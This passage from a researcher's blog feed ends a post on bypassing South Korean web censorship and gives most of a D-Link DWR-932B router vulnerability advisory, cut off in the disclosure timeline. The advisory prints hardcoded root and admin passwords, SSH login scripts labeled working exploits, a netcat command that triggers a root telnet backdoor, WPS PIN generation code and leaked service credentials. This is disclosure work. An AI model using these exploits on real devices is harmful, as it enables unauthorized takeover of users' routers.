<pre><code>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect((webserver, 80))

for req in request.split('\n'):
s.send(req + '\n')
</code></pre>
<p>It is not very performance-oriented but it will bypass the censorship system :)</p>
<p>You can fetch this PoC at <a href="https://github.com/pierrekim/censorship-in-south-korea/blob/master/proxy-readline.py">https://github.com/pierrekim/censorship-in-south-korea/blob/master/proxy-readline.py</a>.</p>
<p><a id="bypassing-by-using-method-only-if-there-is-a-censorship"></a></p>
<h3>6.7: By using a method ONLY if there is a censorship</h3>
<p>When requesting a remote webpage, by observing the answer, we can determine whether a website is censored or not (does the reply contains a 302 redirection to <code>www.warning.or.kr</code> or does it contain the string <code>www.warning.or.kr</code> ?).</p>
<p>If it is censored, the proxy can try consecutively multiple methods (see 6.1 to 6.6) to fetch the resource and, if the censorship is bypassed, to serve it to the client. The proxy can have a hash list corresponding to blocked websites and the working methods to bypass the censorship system.</p>
<p>As CDN are not blocked, this method is very effective. Writing a PoC is left as an exercise for the reader.</p>
<p><a id="bypassing-by-using-a-vpn"></a></p>
<h3>6.8: By using a VPN</h3>
<p>The censorship system does not analyze VPN connections. You can put your traffic inside encrypted connection to bypass it.</p>
<p>This is the easiest solution but can be costly instead of the free ones I listed above.</p>
<p><a id="bypassing-by-using-https-websites-proxies"></a></p>
<h3>6.9: By using HTTPS websites/proxies</h3>
<p>The censorship system does not support HTTPS. You can put your traffic inside encrypted HTTPS connections to bypass it with a remote https proxy or just by accessing to remote HTTPS websites.</p>
<p><a id="conclusion"></a></p>
<h2>7. Conclusion</h2>
<p>The Internet censorship used in South Korea is rudimentary from a technical point of view. It only analyzes <code>Host</code> headers in every request and absolute URLs in old HTTP versions. It doesn't block VPN, HTTPS and HTTP2 websites but analyzes all the TCP connections. It can be bypassed very easily compared to the Chinese wall and is not compatible to a very-old protocol or new-protocol. I discovered no DNS poisoning in my tests.</p>
<p>For some sites, a browser plugin rewriting the <code>Host</code> field will even allow to bypass the censorship (as long as the websites provide webpages for the default/random virtual hosts).</p>
<p>The government is still analyzing at least the headers of all HTTP requests and is comparing the <code>Host</code> header and the <code>URI</code> with a blacklist of domains.</p>
<p>Considering all the efforts that the government of South Korea is making in censorship <a href="https://en.wikipedia.org/wiki/Censorship_in_South_Korea">from a legal point of view</a>, I'm very surprised at the lack of technologies involved - we are speaking about one of the best connected countries in the world with gigabit connections everywhere (although their <a href="https://pierrekim.github.io/blog/2015-07-01-poc-with-RCE-against-127-iptime-router-models.html">routers</a> <a href="https://pierrekim.github.io/blog/2015-05-05-127-iptime-routers-wifiaps-modems-firewalls-models-vulnerable-with-RCE-with-root-privileges.html">are</a> <a href="https://pierrekim.github.io/blog/2015-07-06-127-iptime-router-models-unauthenticated-RCE-with-DHCP.html">massively</a> <a href="https://pierrekim.github.io/blog/2015-07-27-172-iptime-router-models-unauthenticated-RCE-with-DHCP-updated.html">hackable</a>). A 12 year-old boy can bypass this borked censorship system in 5 minutes. We see minimal best effort to block websites, showing that the government wants users to think they are controlling the Internet but doesn't have budget to apply the censorship. We see transparent HTTP proxies with different behaviors (accepting and sometimes blocking for the same webpage), which means deployment problems and inconsistencies in configurations of the blocking solution.</p>
<p>The current solution is not working and, because of its inefficiency dealing with encrypted websites or new protocols, in my view, will be replaced by massive nullroutes of targeted websites. As soon as major adult websites will switch to SSL/TLS, the current censorship system will become completely ineffective.</p>
<p>Note that South Korean social medias (Naver, Daum, ...) appear to be still very monitored. However, using social medias not located in South Korea seems to bypass this censorship. Social medias are not included in the scope of this technical analysis.</p>
<p>Search engines are massively censored as well: Naver.com (first search engine in South Korea) and Google.co.kr will happily return 0 result about certain terms or will ask you information to release results (your name, your phone number, your birthday) saying that: "<em>Harmful results for youth have been excluded. Users being more that 19 year-old can view all the results through the adult authentication.</em>"</p>
<p><a id="credits-and-greeting"></a></p>
<h2>8. Credits and Greetings</h2>
<p>I would like to thank my wife who endures my time-consuming passions (maybe craziness is the correct term).</p>
<p>I would like to thank A, J and T (you know who you are :)</p>
<p>A new generation is coming, we have duties to transfer knowledge in order to show how things work and how to break them. Our freedom depends on it.</p>
<p><a id="personal-note-to-www.warning.or.kr-administrator"></a></p>
<h2>9. Personal note to http://www.warning.or.kr/ administrator</h2>
<p>1/ Please don't use an image containing a lot of Korean text to explain what is going on. Using <a href="http://warning.or.kr/img/img.png">http://warning.or.kr/img/img.png</a> is a bad idea for beginners in Hangeul.</p>
<p>2/ Don't use JavaScript to disable the right click - we are not in the 2000s anymore. Seriously?!?</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">&lt;</span>script language<span style="color: #666666">=</span><span style="color: #BA2121">&quot;JavaScript&quot;</span><span style="color: #666666">&gt;</span>
<span style="color: #408080; font-style: italic">&lt;!--</span>
<span style="color: #008000; font-weight: bold">function</span> click()
{
<span style="color: #008000; font-weight: bold">if</span> (event.button <span style="color: #666666">!=</span> <span style="color: #666666">1</span>) {  } 
}
<span style="color: #008000">document</span>.onmousedown<span style="color: #666666">=</span>click;
<span style="color: #666666">--&gt;</span>
<span style="color: #666666">&lt;</span><span style="border: 1px solid #FF0000">/script&gt;</span>
</pre></div>

<p>3/ Please provide an International/English version for non-Korean speaker/Hangeul-beginner.</p>
<p><a id="license"></a></p>
<h2>10. License</h2>
<p>This research is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Multiple vulnerabilities found in the Dlink DWR-932B (backdoor, backdoor accounts, weak WPS, RCE ...)</title>
        <link href="2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html"/>
        <content type="html"><h2>Product Description</h2>
<p>Dlink is a multinational networking equipment manufacturing corporation.</p>
<h2>Vulnerabilities Summary</h2>
<p>The Dlink DWR-932B is a LTE router / access point overall badly
designed with a lot of vulnerabilities. It's available in a number of countries to
provide Internet with a LTE network. It's a model based on the (in)famous <a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html">Quanta LTE router models</a> and inherits some vulnerabilities.</p>
<p>The tests below are done using the latest available firmware (firmware DWR-932_fw_revB_2_02_eu_en_20150709.zip, model revision B, /Share3/DailyBuild/QDX_DailyBuild/QDT_2031_DLINK/QDT_2031_OS/source/LINUX/apps_proc/oe-core/build/tmp-eglibc/sysroots/x86_64-linux/usr/bin/armv7a-vfp-neon-oe-linux-gnueabi/arm-oe-linux-gnueabi-gcc).</p>
<p>The summary of the vulnerabilities is:</p>
<ul>
<li><a href="#backdoor-accounts">Backdoor accounts</a></li>
<li><a href="#backdoor">Backdoor</a></li>
<li><a href="#default-wps-pin">Default WPS PIN</a></li>
<li><a href="#weak-wps-pin-generation">Weak WPS PIN Generation - with a reverse-engineered algorithm</a></li>
<li><a href="#leaking-no-ip-account">Leaking No-IP account (?)</a></li>
<li><a href="#rce-lulz-httpd">Multiple vulnerabilities in the HTTP daemon (qmiweb)</a></li>
<li><a href="#remote-fota">Remote FOTA (Firmware Over The Air)</a></li>
<li><a href="#bad-security-practices">Bad security practices</a></li>
<li><a href="#security-removed-in-upnp">Security removed in UPnP</a></li>
</ul>
<p>A personal point of view: at best, the vulnerabilites are due to incompetence; at worst, it is a deliberate act of security sabotage from the vendor. Not all the vulnerabilities found have been disclosed in this advisory. Only the significant ones are shown.</p>
<p>This router is still on sale.</p>
<p><strong>Due to lack of security patches provided by the vendor, the vulnerabilities will remain unpatched and customers with questions should contact their local/regional D-Link support office for the latest information.</strong></p>
<p><a id="backdoor-accounts"></a></p>
<h2>Details - Backdoor accounts</h2>
<p>By default, telnetd and SSHd are running in the router.</p>
<p>Telnetd is running even if there is no documentation about it:</p>
<pre><code>user@kali:~$ cat ./etc/init.d/start_appmgr

[...]
#Sandro { for telnetd debug...
start-stop-daemon -S -b -a /bin/logmaster
#if [ -e /config2/telnetd ]; then
        start-stop-daemon -S -b -a /sbin/telnetd
#fi
#Sandro }
[...]
</code></pre>
<p>2 backdoor accounts exist and can be used to bypass the HTTP authentication used to manage the router.</p>
<pre><code>admin@homerouter:~$ grep admin /etc/passwd 
admin:htEcF9TWn./9Q:168:168:admin:/:/bin/sh
admin@homerouter:~$
</code></pre>
<p>The password for admin is 'admin' and can be found in the <code>/bin/appmgr</code> program using IDA:</p>
<p><img alt="" src="images/2016-quanta-backdoor-admin-default-mod_sysadm_config_passwd.png" /></p>
<p>About the root user:</p>
<pre><code>user@kali:~$ cat ./etc/shadow
root:aRDiHrJ0OkehM:16270:0:99999:7:::
daemon:*:16270:0:99999:7:::
bin:*:16270:0:99999:7:::
sys:*:16270:0:99999:7:::
sync:*:16270:0:99999:7:::
games:*:16270:0:99999:7:::
man:*:16270:0:99999:7:::
lp:*:16270:0:99999:7:::
mail:*:16270:0:99999:7:::
news:*:16270:0:99999:7:::
uucp:*:16270:0:99999:7:::
proxy:*:16270:0:99999:7:::
www-data:*:16270:0:99999:7:::
backup:*:16270:0:99999:7:::
list:*:16270:0:99999:7:::
irc:*:16270:0:99999:7:::
gnats:*:16270:0:99999:7:::
diag:*:16270:0:99999:7:::
nobody:*:16270:0:99999:7:::
messagebus:!:16270:0:99999:7:::
avahi:!:16270:0:99999:7:::
admin@kali:~$
</code></pre>
<p>Using john to crack the hashes:</p>
<pre><code>user@kali:~$ john -show shadow+passwd
admin:admin:admin:/:/bin/sh
root:1234:16270:0:99999:7:::

2 password hashes cracked, 0 left
user@kali:~$
</code></pre>
<p>Results:</p>
<ul>
<li>admin has password admin</li>
<li>root has password 1234</li>
</ul>
<p>Working exploit for admin:</p>
<pre><code>user@kali:~$ cat quanta-ssh-default-password-admin
#!/usr/bin/expect -f

set timeout 3
spawn ssh admin@192.168.1.1
expect "password: $"
send "admin\r"
interact
user@kali:~$ ./quanta-ssh-default-password-admin
spawn ssh admin@192.168.1.1
admin@192.168.1.1's password:
admin@homerouter:~$ id
uid=168(admin) gid=168(admin) groups=168(admin)
admin@homerouter:~$
</code></pre>
<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-ssh-default-password-admin">https://pierrekim.github.io/advisories/quanta-ssh-default-password-admin</a>.</p>
<p>Working exploit for root:</p>
<pre><code>user@kali:~$ cat quanta-ssh-default-password-root
#!/usr/bin/expect -f

set timeout 3
spawn ssh root@192.168.1.1
expect "password: $"
send "1234\r"
interact
user@kali:~$ ./quanta-ssh-default-password-root
spawn ssh root@192.168.1.1
root@192.168.1.1's password:
root@homerouter:~# id
uid=168(root) gid=168(root) groups=168(root)
root@homerouter:~#
</code></pre>
<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-ssh-default-password-root">https://pierrekim.github.io/advisories/quanta-ssh-default-password-root</a>.</p>
<p><a id="backdoor"></a></p>
<h2>Details - Backdoor</h2>
<p>A backdoor is present inside the <code>/bin/appmgr</code> program. By sending a specific string in UDP to the router, an authentication-less telnet server will start if a telnetd daemon is not already running.</p>
<p>In <code>/bin/appmgr</code>, a thread listens to 0.0.0.0:39889 (UDP) and waits for commands.</p>
<p>If a client sends "HELODBG" to the router, the router will execute <code>/sbin/telnetd -l /bin/sh</code>, allowing to access without authentication to the router as root.</p>
<p>When using IDA, we can see the backdoor is located in the main function (line 369):</p>
<p><img alt="" src="images/2016-dlink-backdoor-telnet.png" /></p>
<p>Working PoC :</p>
<pre><code>user@kali:~$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889
Hello
^C
user@kali:~$ telnet 192.168.1.1
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.

OpenEmbedded Linux homerouter.cpe


msm 20141210 homerouter.cpe

/ # id
uid=0(root) gid=0(root)
/ # exit
Connection closed by foreign host.
user@kali:~$
</code></pre>
<p><a id="default-wps-pin"></a></p>
<h2>Details - Default WPS PIN</h2>
<p>Wi-Fi Protected Setup(WPS) is a standard for easy and secure establishment of a wireless home network, as defined in the documentation provided in the router (help.html).</p>
<p>By default, the PIN for the WPS system is ever <code>28296607</code>. It is, in fact, hardcoded in the <code>/bin/appmgr</code> program:</p>
<p><img alt="" src="images/2016-dlink-wifi_get_default_wps_pin.png" /></p>
<p>This PIN can be found in the HostAP configuration too, and, using the information leak, in the HTTP APIs of the router:</p>
<pre><code>root@homerouter:~# ps -a|grep hostap
 1006 root       0:00 hostapd /var/wifi/ar6k0.conf
 1219 root       0:00 grep hostap
root@homerouter:~# cat /var/wifi/ar6k0.conf
[...]
ap_pin=28296607
[...]
</code></pre>
<p><a id="weak-wps-pin-generation"></a></p>
<h2>Details - Weak WPS PIN Generation - with a reverse-engineered algorithm</h2>
<p>An user can use the webinterface to generate a temporary PIN for the WPS system (low probability as the <code>28296607</code> WPS PIN is provided by default).</p>
<p>The PIN generated by the router is weak as it is generated using this "strange" reverse-engineered algorithm:</p>
<pre><code>user@kali:~$ cat quanta-wps-gen.c
</code></pre>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdio.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdlib.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;time.h&gt;</span><span style="color: #BC7A00"></span>

<span style="color: #B00040">int</span> <span style="color: #0000FF">main</span>(<span style="color: #B00040">int</span>    argc,
         <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>argv,
         <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>envp)
{ 
  <span style="color: #B00040">unsigned</span> <span style="color: #B00040">int</span>  i0, i1;
  <span style="color: #B00040">int</span>           i2;

  <span style="color: #408080; font-style: italic">/* the seed is the current time of the router, which uses NTP... */</span>
  srand(time(<span style="color: #666666">0</span>));

  i0 <span style="color: #666666">=</span> rand() <span style="color: #666666">%</span> <span style="color: #666666">10000000</span>;
  <span style="color: #008000; font-weight: bold">if</span> (i0 <span style="color: #666666">&lt;=</span> <span style="color: #666666">999999</span>)
    i0 <span style="color: #666666">+=</span> <span style="color: #666666">1000000</span>;
  i1 <span style="color: #666666">=</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0;
  i2 <span style="color: #666666">=</span> (<span style="color: #666666">10</span> <span style="color: #666666">-</span> (i1 <span style="color: #666666">/</span> <span style="color: #666666">10000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">1000000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">100</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">3</span> <span style="color: #666666">*</span>
       (i1 <span style="color: #666666">/</span> <span style="color: #666666">100000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0 <span style="color: #666666">/</span> <span style="color: #666666">10000000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">1000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">10</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span>))
        <span style="color: #666666">%</span> <span style="color: #666666">10</span>) <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0;

  printf(<span style="color: #BA2121">&quot;%d</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, i2 );

  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">0</span>);
}
</pre></div>

<pre><code>user@kali:~$ gcc -o dlink-wps-gen quanta-wps-gen.c
user@kali:~$ ./dlink-wps-gen
97329329
user@kali:~$
</code></pre>
<p>You can fetch this program at <a href="https://pierrekim.github.io/advisories/quanta-wps-gen.c">https://pierrekim.github.io/advisories/quanta-wps-gen.c</a>.</p>
<p>Using <code>srand(time(0))</code> as a seed is a bad idea because an attacker, knowing the current date as <code>time(0)</code> returns the current date in an integer value, can just generate the valid WPS PIN. The Router uses NTP so is likely to have a correct timestamp configured. It's trivial for an attacker to generate valid WPS PIN suites and bruteforce them.</p>
<p>For the curious reader, the original algorithm in the firmware is:</p>
<pre><code>.text:0001B4D4                 EXPORT generate_wlan_wps_enrollee_pin
.text:0001B4D4 generate_wlan_wps_enrollee_pin          ; CODE XREF: wifi_msg_handle+194p
.text:0001B4D4
.text:0001B4D4 var_3C          = -0x3C
.text:0001B4D4 var_38          = -0x38
.text:0001B4D4 s               = -0x34
.text:0001B4D4 var_30          = -0x30
.text:0001B4D4 var_2C          = -0x2C
.text:0001B4D4
.text:0001B4D4                 STMFD           SP!, {R4-R11,LR}
.text:0001B4D8                 SUB             SP, SP, #0x1C
.text:0001B4DC                 STR             R0, [SP,#0x40+s]
.text:0001B4E0                 MOV             R0, #0  ; timer
.text:0001B4E4                 BL              time
.text:0001B4E8                 BL              srand
.text:0001B4EC                 BL              rand
.text:0001B4F0                 LDR             R4, =0x6B5FCA6B
.text:0001B4F4                 MOV             R6, R0,ASR#31
.text:0001B4F8                 SMULL           R1, R4, R0, R4
.text:0001B4FC                 RSB             R10, R6, R4,ASR#22
.text:0001B500                 RSB             R12, R10, R10,LSL#5
.text:0001B504                 RSB             R2, R12, R12,LSL#6
.text:0001B508                 ADD             R11, R10, R2,LSL#3
.text:0001B50C                 LDR             R8, =0xF423F
.text:0001B510                 ADD             R9, R11, R11,LSL#2
.text:0001B514                 SUB             R1, R0, R9,LSL#7
.text:0001B518                 CMP             R1, R8
.text:0001B51C                 ADDLS           R1, R1, #0xF4000
.text:0001B520                 ADDLS           R1, R1, #0x240
.text:0001B524                 ADD             R3, R1, R1,LSL#2
.text:0001B528                 MOV             R3, R3,LSL#1
.text:0001B52C                 LDR             R1, =0xCCCCCCCD
.text:0001B530                 LDR             R5, =0xA7C5AC5
.text:0001B534                 LDR             R6, =0x6B5FCA6B
.text:0001B538                 MOV             R7, R3,LSR#5
.text:0001B53C                 UMULL           R4, R7, R5, R7
.text:0001B540                 UMULL           R9, LR, R1, R3
.text:0001B544                 UMULL           R5, R6, R3, R6
.text:0001B548                 LDR             R12, =0xD1B71759
.text:0001B54C                 MOV             R6, R6,LSR#22
.text:0001B550                 UMULL           R10, R12, R3, R12
.text:0001B554                 MOV             LR, LR,LSR#3
.text:0001B558                 UMULL           R10, R9, R1, R6
.text:0001B55C                 UMULL           R8, R10, R1, LR
.text:0001B560                 LDR             R0, =0x431BDE83
.text:0001B564                 MOV             R12, R12,LSR#13
.text:0001B568                 UMULL           R11, R0, R3, R0
.text:0001B56C                 STR             R10, [SP,#0x40+var_38]
.text:0001B570                 UMULL           R8, R10, R1, R12
.text:0001B574                 LDR             R2, =0x51EB851F
.text:0001B578                 LDR             R4, =0x10624DD3
.text:0001B57C                 UMULL           R5, R2, R3, R2
.text:0001B580                 MOV             R0, R0,LSR#18
.text:0001B584                 STR             R10, [SP,#0x40+var_3C]
.text:0001B588                 UMULL           R8, R4, R3, R4
.text:0001B58C                 UMULL           R8, R10, R1, R0
.text:0001B590                 MOV             R2, R2,LSR#5
.text:0001B594                 MOV             R7, R7,LSR#7
.text:0001B598                 UMULL           R8, R11, R1, R7
.text:0001B59C                 STR             R10, [SP,#0x40+var_30]
.text:0001B5A0                 MOV             R4, R4,LSR#6
.text:0001B5A4                 UMULL           R8, R10, R1, R2
.text:0001B5A8                 UMULL           R8, R5, R1, R4
.text:0001B5AC                 STR             R10, [SP,#0x40+var_2C]
.text:0001B5B0                 MOV             R8, R9,LSR#3
.text:0001B5B4                 MOV             R10, R11,LSR#3
.text:0001B5B8                 ADD             R11, R10, R10,LSL#2
.text:0001B5BC                 ADD             R9, R8, R8,LSL#2
.text:0001B5C0                 MOV             R10, R5,LSR#3
.text:0001B5C4                 LDR             R8, [SP,#0x40+var_38]
.text:0001B5C8                 SUB             R6, R6, R9,LSL#1
.text:0001B5CC                 SUB             R7, R7, R11,LSL#1
.text:0001B5D0                 LDR             R9, [SP,#0x40+var_3C]
.text:0001B5D4                 LDR             R11, [SP,#0x40+var_30]
.text:0001B5D8                 ADD             R5, R10, R10,LSL#2
.text:0001B5DC                 SUB             R5, R4, R5,LSL#1
.text:0001B5E0                 LDR             R4, [SP,#0x40+var_2C]
.text:0001B5E4                 MOV             R10, R8,LSR#3
.text:0001B5E8                 MOV             R8, R9,LSR#3
.text:0001B5EC                 MOV             R9, R11,LSR#3
.text:0001B5F0                 ADD             R7, R7, R6
.text:0001B5F4                 ADD             R10, R10, R10,LSL#2
.text:0001B5F8                 ADD             R9, R9, R9,LSL#2
.text:0001B5FC                 MOV             R11, R4,LSR#3
.text:0001B600                 ADD             R8, R8, R8,LSL#2
.text:0001B604                 ADD             R7, R7, R5
.text:0001B608                 SUB             LR, LR, R10,LSL#1
.text:0001B60C                 SUB             R5, R0, R9,LSL#1
.text:0001B610                 SUB             R8, R12, R8,LSL#1
.text:0001B614                 ADD             R11, R11, R11,LSL#2
.text:0001B618                 ADD             R12, R7, LR
.text:0001B61C                 SUB             R4, R2, R11,LSL#1
.text:0001B620                 ADD             R8, R8, R5
.text:0001B624                 ADD             R5, R8, R4
.text:0001B628                 ADD             R0, R12, R12,LSL#1
.text:0001B62C                 ADD             R4, R5, R0
.text:0001B630                 UMULL           R5, R1, R4, R1
.text:0001B634                 MOV             R2, R1,LSR#3
.text:0001B638                 ADD             LR, R2, R2,LSL#2
.text:0001B63C                 SUB             R8, R4, LR,LSL#1
.text:0001B640                 LDR             R0, =0x66666667
.text:0001B644                 RSB             R2, R8, #0xA
.text:0001B648                 SMULL           R8, R0, R2, R0
.text:0001B64C                 MOV             R12, R2,ASR#31
.text:0001B650                 RSB             R1, R12, R0,ASR#2
.text:0001B654                 ADD             LR, R1, R1,LSL#2
.text:0001B658                 LDR             R12, =(aHostapd_conf_f - 0x1B670)
.text:0001B65C                 SUB             R4, R2, LR,LSL#1
.text:0001B660                 LDR             R2, =(aGet_wpspinI - 0x1B67C)
.text:0001B664                 ADD             R4, R4, R3
.text:0001B668                 ADD             R0, PC, R12 ; "hostapd_conf_file_gen"
.text:0001B66C                 ADD             R0, R0, #0x3C
.text:0001B670                 MOV             R1, #0x3B
.text:0001B674                 ADD             R2, PC, R2 ; "Get_WpsPin:%in"
.text:0001B678                 MOV             R3, R4
.text:0001B67C                 BL              wifi_filelog
.text:0001B680                 LDR             R1, =(a08lu - 0x1B690)
.text:0001B684                 LDR             R0, [SP,#0x40+s] ; s
.text:0001B688                 ADD             R1, PC, R1 ; "%08lu"
.text:0001B68C                 MOV             R2, R4
.text:0001B690                 ADD             SP, SP, #0x1C
.text:0001B694                 LDMFD           SP!, {R4-R11,LR}
.text:0001B698                 B               sprintf
.text:0001B698 ; End of function generate_wlan_wps_enrollee_pin
</code></pre>
<p><a id="leaking-no-ip-account"></a></p>
<h2>Details - Leaking No-IP account (?):</h2>
<p>The file <code>/etc/inadyn-mt.conf</code> (for a dyndns client) contains an user and a hardcoded password:</p>
<pre><code>--log_file /usr/inadyn_srv.log
--forced_update_period 6000
--username alex_hung
--password 641021
--dyndns_system default@no-ip.com
--alias test.no-ip.com
</code></pre>
<p><a id="rce-lulz-httpd"></a></p>
<h2>Details - Multiple vulnerabilities in the HTTP daemon (qmiweb)</h2>
<p>The HTTP daemon <code>/bin/qmiweb</code> is full of vulnerabilities.</p>
<p>You can see my precedent researches about a router model using a similar firmware:</p>
<ul>
<li><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#webinterface-information-leak">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#webinterface-information-leak</a></li>
<li><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#rce-1">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#rce-1</a></li>
<li><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#rce-2">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#rce-2</a></li>
<li><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#arbitrary-file-browsing-using-the-http-daemon">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#arbitrary-file-browsing-using-the-http-daemon</a></li>
<li><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#arbitrary-file-reading-using-the-http-daemon">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#arbitrary-file-reading-using-the-http-daemon</a></li>
</ul>
<p>Adapting the exploits is left as exercises for the reader :)</p>
<p><a id="remote-fota"></a></p>
<h2>Details - Remote FOTA (Firmware Over The Air)</h2>
<p>The credentials to contact the FOTA server are hardcoded in the <code>/sbin/fotad</code> binary, as shown with this IDA screenshot:</p>
<p><img alt="" src="images/2016-dlink-sbin-fota-http-req.png" /></p>
<p>The function sub_CAAC contains the credentials as base64-strings, used to retrieve the firmware.</p>
<p>It's notable the FOTA daemon tries to retrieve the firmware over HTTPS. But at the date of the writing,
the SSL certificate for <a href="https://qdp:qdp@fotatest.qmitw.com/qdh/ispname/2031/appliance.xml">https://qdp:qdp@fotatest.qmitw.com/qdh/ispname/2031/appliance.xml</a> is invalid for 1.5 year.</p>
<p><img alt="" src="images/2016-dlink-sbin-fota-http-req-auth-passwords.png" /></p>
<p>The user/password combinations are:</p>
<pre><code>qdpc:qdpc
qdpe:qdpe
qdp:qdp
</code></pre>
<p><a id="bad-security-practices"></a></p>
<h2>Details - Bad security practices:</h2>
<p>From <code>/etc/init.d/start_appmgr</code>, you will read "strange" shell commands executed as root, like:</p>
<pre><code>if [  -f /sbin/netcfg ]; then
        echo -n "chmod 777 netcfg"
        chmod 777 /sbin/netcfg
fi
if [  -f /bin/QNetCfg ]; then
        echo -n "chmod 777 QNetCfg"
        chmod 777 /bin/QNetCfg
fi
</code></pre>
<p>I have no idea why the vendor needs to chmod 777 files located in /bin/.</p>
<p><a id="security-removed-in-upnp"></a></p>
<h2>Details - Security removed in UPnP</h2>
<p>UPnP allows to add firewall rules dynamically. Because of the security risks involved, generally there are restrictions in place to avoid dangerous new firewall rules from an unstrusted LAN client.</p>
<p>Insecurity in IPnP was hype 10 years ago (in 2006). The security level of the UPNP program (miniupnp) in this router is volountarily lowered as shown below and allows an attacker located in the LAN area to add Port forwarding from the Internet to other clients located in the LAN:</p>
<p>The /var/miniupnpd.conf is generated by the <code>/bin/appmgr</code> program:</p>
<p><img alt="" src="images/2016-dlink-appmgr-sub_2AE0C.png" /></p>
<p>It will generate the <code>/var/miniupnpd.conf</code> file:</p>
<pre><code>ext_ifname=rmnet0
listening_ip=bridge0
port=2869
enable_natpmp=yes
enable_upnp=yes
bitrate_up=14000000
bitrate_down=14000000
secure_mode=no      # "secure" mode : when enabled, UPnP client are allowed to add mappings only to their IP.
presentation_url=http://192.168.1.1
system_uptime=yes
notify_interval=30
upnp_forward_chain=MINIUPNPD
upnp_nat_chain=MINIUPNPD
</code></pre>
<p>There is no restriction about the UPnP permission rules in the configuration file, contrary to common usage in UPnP where it is advised to only allow redirection of port above 1024:</p>
<p>Normal config file:</p>
<pre><code># UPnP permission rules
# (allow|deny) (external port range) ip/mask (internal port range)
# A port range is &lt;min port&gt;-&lt;max port&gt; or &lt;port&gt; if there is only
# one port in the range.
# ip/mask format must be nn.nn.nn.nn/nn
# it is advised to only allow redirection of port above 1024
# and to finish the rule set with "deny 0-65535 0.0.0.0/0 0-65535"
allow 1024-65535 192.168.0.0/24 1024-65535
deny 0-65535 0.0.0.0/0 0-65535
</code></pre>
<p>In the configuration of the vulnerable router where there are no permission rules, an attacker can forward everything from the WAN into the LAN. For example, an attacker can add a forwarding rule in order to allow traffic from the Internet to local Exchange servers, mail servers, ftp servers, http servers, database servers... In fact, this lack of security allows a local user to forward whatever they want from the Internet into the LAN.</p>
<h2>Personal notes</h2>
<p>As the router has a sizable memory (168 MB), a decent CPU and good free space (235 MB) with complete toolkits installed by default (sshd, proxy (<code>/bin/tinyproxy -c /var/tproxy.conf</code>), tcpdump ...), I advise users to trash their routers because it's trivial for an attacker to use this router as an attack vector (ie: hosting a sniffing tool, LAN hacking, active MiTM tool, spamming zombie).</p>
<p>From my tests, it is possible to overwrite the firmware with a custom (backdoored) firmware. Generating a valid backdoored firmware is left as an exercise for the reader, but with all these vulnerabilities present in the default firmware, I don't think it is worth making the effort.</p>
<h2>Vendor Response</h2>
<p>Customers with questions should contact their local/regional D-Link support offices for the latest information.</p>
<h2>Report Timeline</h2>
<ul>
<li>Dec 04, 2015: Vulnerabilities found by Pierre Kim in Quanta routers.</li>
<li>Apr 04, 2016: A public advisory about Quanta routers is sent to security mailing lists.</li>
<li>Jun 09, 2016: Pierre Kim is contacted by Gianni Carabelli about Dlink DWR-932 router's similarities to Quanta routers.</li>
<li>Jun 14, 2016: Pierre Kim thanks Gianni Carabelli and says he will contact Dlink.</li>
<li>Jun 15, 2016: Dlink is contacted about vulnerabilities in the DWR-932 router (=~ 20 vulns).</li>
<li>Jun 16, 2016: Dlink Security Incident Response Team (William Brown) acknowledges the receipt of the report and says they will provide further updates.</li>
